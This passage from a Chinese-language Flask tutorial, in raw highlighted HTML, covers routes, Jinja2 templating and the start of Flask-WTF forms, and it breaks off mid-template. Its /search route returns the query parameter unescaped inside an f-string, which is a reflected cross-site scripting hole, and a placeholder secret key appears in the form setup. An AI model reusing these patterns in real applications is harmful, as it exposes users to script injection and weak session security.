punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    query <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Search results for: </span><span class="token interpolation"><span class="token punctuation">{</span>query<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/json'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">json_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Flask"</span><span class="token punctuation">,</span> <span class="token string">"version"</span><span class="token punctuation">:</span> <span class="token string">"2.0"</span><span class="token punctuation">}</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/old-url'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">old_url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'home'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">secret</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    abort<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask-模板渲染"><a href="#Flask-模板渲染" class="headerlink" title="Flask 模板渲染"></a>Flask 模板渲染</h2><p>在 Flask 中，模板渲染是生成动态 HTML 页面的一种方法。Flask 使用 Jinja2 模板引擎来帮助你在 HTML 中插入变量、控制结构（如条件判断、循环）等内容，以便动态生成页面。</p><h3 id="1-设置模板文件夹"><a href="#1-设置模板文件夹" class="headerlink" title="1. 设置模板文件夹"></a>1. 设置模板文件夹</h3><p>在 Flask 项目中，默认的模板文件夹是 <code>templates</code>，建议将所有 HTML 模板文件放在这个文件夹中。Flask 会自动寻找并渲染该目录中的模板文件。</p><h3 id="2-创建基本-HTML-模板"><a href="#2-创建基本-HTML-模板" class="headerlink" title="2. 创建基本 HTML 模板"></a>2. 创建基本 HTML 模板</h3><p>假设我们在 <code>templates/index.html</code> 中创建了一个基本的 HTML 模板文件：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- templates/index.html --&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>{{ title }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>{{ heading }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>{{ content }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个模板中：</p><ul><li><code>{{ title }}</code>、<code>{{ heading }}</code> 和 <code>{{ content }}</code> 是变量占位符，在渲染模板时会被 Flask 替换成实际的值。</li></ul><h3 id="3-渲染模板"><a href="#3-渲染模板" class="headerlink" title="3. 渲染模板"></a>3. 渲染模板</h3><p>在 Flask 中，可以使用 <code>render_template</code> 函数来渲染 HTML 模板，并将变量传递给模板。下面是一个简单的视图函数，渲染上面的 <code>index.html</code> 模板。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">"Home Page"</span><span class="token punctuation">,</span> heading<span class="token operator">=</span><span class="token string">"Welcome to My Website"</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">"This is the home page content."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>render_template('index.html', ...)</code>：<code>render_template</code> 函数会在 <code>templates</code> 文件夹中找到 <code>index.html</code> 文件，并将指定变量传入模板。</li><li><code>title="Home Page"</code>：将 <code>title</code> 变量的值传入模板，模板中的 <code>{{ title }}</code> 将被替换为 <code>Home Page</code>。</li></ul><h3 id="4-模板变量和控制结构"><a href="#4-模板变量和控制结构" class="headerlink" title="4. 模板变量和控制结构"></a>4. 模板变量和控制结构</h3><p>Jinja2 模板支持在 HTML 中使用变量、控制结构（条件、循环）等操作。</p><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>使用双大括号 <code>{{ ... }}</code> 在模板中插入变量。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Hello, {{ name }}!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><p>使用 <code>{% if ... %}` 和 `{% endif %}</code> 添加条件逻辑：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">{% if user_is_logged_in %}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Welcome back, {{ username }}!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>{% else %}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Please log in to access your account.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>{% endif %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><p>使用 <code>{% for ... in ... %}` 和 `{% endfor %}</code> 添加循环：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>    {% for item in items %}        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>{{ item }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>    {% endfor %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-继承与块"><a href="#5-继承与块" class="headerlink" title="5. 继承与块"></a>5. 继承与块</h3><p>Jinja2 支持模板继承，可以创建一个基础模板供其他模板继承。可以将公共结构（如导航栏、页脚等）放在基础模板中，然后在子模板中覆盖特定部分。</p><h4 id="基础模板-templates-base-html"><a href="#基础模板-templates-base-html" class="headerlink" title="基础模板 templates/base.html"></a>基础模板 <code>templates/base.html</code></h4><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>{% block title %}My Website{% endblock %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>My Website<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">&gt;</span></span>        {% block content %}{% endblock %}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>© 2024 My Website<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>{% block title %}` 和 `{% block content %}` 是块占位符，子模板可以覆盖这些内容。#### 子模板 `templates/index.html`<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">{% extends "base.html" %}{% block title %}Home Page{% endblock %}{% block content %}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>Welcome to the Home Page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>This is some content specific to the home page.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>{% endblock %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>- `{% extends "base.html" %}` 表示继承 `base.html` 模板。- `{% block title %}Home Page{% endblock %}</code>：覆盖了基础模板中的 <code>title</code> 块。</li><li><code>{% block content %}...{% endblock %}</code>：覆盖了基础模板中的 <code>content</code> 块。</li></ul><h3 id="6-使用静态文件"><a href="#6-使用静态文件" class="headerlink" title="6. 使用静态文件"></a>6. 使用静态文件</h3><p>Flask 默认将静态文件放在 <code>static</code> 文件夹中，例如 CSS、JavaScript 文件等。在模板中，可以通过 <code>url_for('static', filename='...')</code> 生成静态文件的 URL。</p><p>假设有一个 CSS 文件 <code>static/style.css</code>，可以在模板中引入：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 在 base.html 中引入 CSS 文件 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{{ url_for('static', filename='style.css') }}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="7-完整示例"><a href="#7-完整示例" class="headerlink" title="7. 完整示例"></a>7. 完整示例</h3><p>以下是包含基础模板、变量、循环、条件的完整 Flask 应用示例。</p><h4 id="项目结构-1"><a href="#项目结构-1" class="headerlink" title="项目结构"></a>项目结构</h4><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">my_flask_app<span class="token operator">/</span>├── app<span class="token punctuation">.</span>py├── templates<span class="token operator">/</span>│   ├── <span class="token keyword">base</span><span class="token punctuation">.</span>html│   ├── index<span class="token punctuation">.</span>html└── <span class="token keyword">static</span><span class="token operator">/</span>    └── style<span class="token punctuation">.</span>css<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="app-py"><a href="#app-py" class="headerlink" title="app.py"></a><code>app.py</code></h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    items <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Item 1"</span><span class="token punctuation">,</span> <span class="token string">"Item 2"</span><span class="token punctuation">,</span> <span class="token string">"Item 3"</span><span class="token punctuation">]</span>    user_is_logged_in <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">"Home Page"</span><span class="token punctuation">,</span> items<span class="token operator">=</span>items<span class="token punctuation">,</span> user_is_logged_in<span class="token operator">=</span>user_is_logged_in<span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token string">"John Doe"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="templates-base-html"><a href="#templates-base-html" class="headerlink" title="templates/base.html"></a><code>templates/base.html</code></h4><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>{% block title %}My Website{% endblock %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{{ url_for('static', filename='style.css') }}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>My Website<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">&gt;</span></span>        {% block content %}{% endblock %}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>© 2024 My Website<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="templates-index-html"><a href="#templates-index-html" class="headerlink" title="templates/index.html"></a><code>templates/index.html</code></h4><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">{% extends "base.html" %}{% block title %}Home Page{% endblock %}{% block content %}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>Welcome to the Home Page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>    {% if user_is_logged_in %}        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Welcome back, {{ username }}!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>    {% else %}        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Please log in to access your account.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>    {% endif %}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>        {% for item in items %}            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>{{ item }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>        {% endfor %}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>{% endblock %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="static-style-css"><a href="#static-style-css" class="headerlink" title="static/style.css"></a><code>static/style.css</code></h4><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* 示例样式 */</span><span class="token selector">body</span> <span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">header</span> <span class="token punctuation">{</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> #333<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> 1em<span class="token punctuation">;</span>    <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">footer</span> <span class="token punctuation">{</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> #333<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> 0.5em<span class="token punctuation">;</span>    <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask-表单处理"><a href="#Flask-表单处理" class="headerlink" title="Flask 表单处理"></a>Flask 表单处理</h2><p>在 Flask 中，表单处理是一个常见的功能，它涉及接收用户输入、验证数据以及相应地进行处理。Flask 提供了 <code>Flask-WTF</code> 扩展，使得表单的创建、验证和处理变得更加简单和强大。下面将详细介绍如何在 Flask 中处理表单，包括安装 Flask-WTF、创建表单、验证表单、显示表单错误和处理表单数据。</p><h3 id="1-安装-Flask-WTF"><a href="#1-安装-Flask-WTF" class="headerlink" title="1. 安装 Flask-WTF"></a>1. 安装 Flask-WTF</h3><p>在开始之前，你需要确保安装了 <code>Flask-WTF</code>。可以通过 <code>pip</code> 进行安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> Flask-WTF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-创建-Flask-应用"><a href="#2-创建-Flask-应用" class="headerlink" title="2. 创建 Flask 应用"></a>2. 创建 Flask 应用</h3><p>创建一个简单的 Flask 应用并设置基本配置。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm<span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token punctuation">,</span> SubmitField<span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> DataRequiredapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'your_secret_key'</span>  <span class="token comment"># 设置安全密钥</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-创建表单类"><a href="#3-创建表单类" class="headerlink" title="3. 创建表单类"></a>3. 创建表单类</h3><p>使用 <code>Flask-WTF</code> 创建表单类，定义所需的字段和验证规则。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'Username'</span><span class="token punctuation">,</span> validators<span class="token operator">=</span><span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'Submit'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>StringField</code>：表示一个文本输入字段。</li><li><code>DataRequired()</code>：确保字段不为空。</li></ul><h3 id="4-渲染表单"><a href="#4-渲染表单" class="headerlink" title="4. 渲染表单"></a>4. 渲染表单</h3><p>在视图函数中实例化表单并传递给模板。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> MyForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 验证表单数据</span>        username <span class="token operator">=</span> form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data  <span class="token comment"># 获取输入的用户名</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Hello, </span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">!'</span></span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>validate_on_submit()</code>：检查请求方法是否为 POST 并验证表单数据。</li><li><code>form.username.data</code>：访问用户输入的值。</li></ul><h3 id="5-创建模板"><a href="#5-创建模板" class="headerlink" title="5. 创建模板"></a>5. 创建模板</h3><p>在 <code>templates</code> 文件夹中创建一个模板 <code>index.html</code>，用于显示表单。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- templates/index.html --&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Flask Form Example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token 